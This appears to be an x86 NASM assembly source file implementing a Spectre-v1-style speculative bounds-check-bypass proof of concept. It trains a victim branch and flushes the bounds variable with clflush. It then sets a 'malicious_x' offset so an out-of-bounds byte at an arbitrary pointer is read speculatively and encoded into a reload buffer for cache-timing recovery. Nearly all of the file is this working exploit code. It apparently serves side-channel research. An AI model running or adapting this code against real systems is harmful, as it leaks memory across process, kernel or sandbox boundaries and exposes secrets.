%include "common.S"

section .data noexec write
    align   0x1000 
    min_off:    dq  LEAK_SIZE*STRIDE

    align   0x1000
    %define  WIN_TRAIN_ROUND 5          ;TWEAK
    %define  WIN_TRAIN_SIZE  64
    offsets:    
        %rep WIN_TRAIN_ROUND
            %rep   WIN_TRAIN_SIZE-1
            dq  LEAK_SIZE*STRIDE
            %endrep 
            dq  0
        %endrep

section .text
default rel

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; victim_function(uint64_t offset, uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;rdi: offset
;rsi: reload_buf
victim_function:
    add     rsi, rdi
    cmp     rdi, qword [min_off]
    jl      victim_function_skip
    LOADS   rsi
victim_function_skip:
    ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; bht_win_size(uint8_t *reload_buffer)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global bht_win_size
bht_win_size:
    push    r14
    push    r15
    push    rcx
    mov     r15, rdi
    SERIALIZE

    lea     r14, [offsets]
    mov     rcx, WIN_TRAIN_ROUND*WIN_TRAIN_SIZE 

bht_win_size_loop:
    ;make comparision slow
    clflush [min_off]
    mfence
    mov     rdi, qword [r14]    ;rdi = offsets[i]
    mov     rsi, r15            ;rsi = reload_buf
    call    victim_function
    add     r14, 8
    loop    bht_win_size_loop

    pop     rcx
    pop     r15
    pop     r14
    ret
    
    
section .data noexec write
    %define  LEAK_TRAIN_SIZE  40    ;TWEAK

    align   0x1000
    array1:
        %assign i 0
        %rep    LEAK_TRAIN_SIZE
            dq  LEAK_SIZE-1         ;Spurious hits to LEAK_SIZE-1 
        %assign i i+1
        %endrep
    
    align   0x1000
    array1_size:
        dq  LEAK_TRAIN_SIZE*8

    align   0x1000
    train_x:
        %assign i 0
        %rep    LEAK_TRAIN_SIZE-1
        dq      i*8 
        %assign i i+1
        %endrep
    malicious_x:
        dq  0xffffffffffffffff


section .text
;rdi = reload_buf
;rsi = x
victim_function_leak:
    lea     rax, [array1 + rsi]     
    cmp     rsi, [array1_size] 
    jge     victim_function_leak_skip
    LEAK    rdi, rax

victim_function_leak_skip:
    ret
    

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; bht_leak(uint8_t *reload_buffer, uint8_t *leak_ptr)
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
global bht_leak
bht_leak:
    push    r14
    push    r15
    push    rcx
    mov     r15, rdi

    ;malicious_x = leak_ptr - array1
    lea     rax, [array1]
    sub     rsi, rax
    mov     qword [malicious_x], rsi

    lea     r14, [train_x]
    mov     rcx, LEAK_TRAIN_SIZE 

bht_leak_loop:
    clflush [array1_size]               ;make comparision slow
    clflush [r15+(LEAK_SIZE-1)*STRIDE]  ;remove spurious hit to LEAK_SIZE-1
    mfence
    mov     rdi, r15            ;rdi = reload_buf 
    mov     rsi, qword [r14]    ;rsi = train_x[i]
    call    victim_function_leak
    add     r14, 8
    loop    bht_leak_loop

    pop     rcx
    pop     r15
    pop     r14
    ret
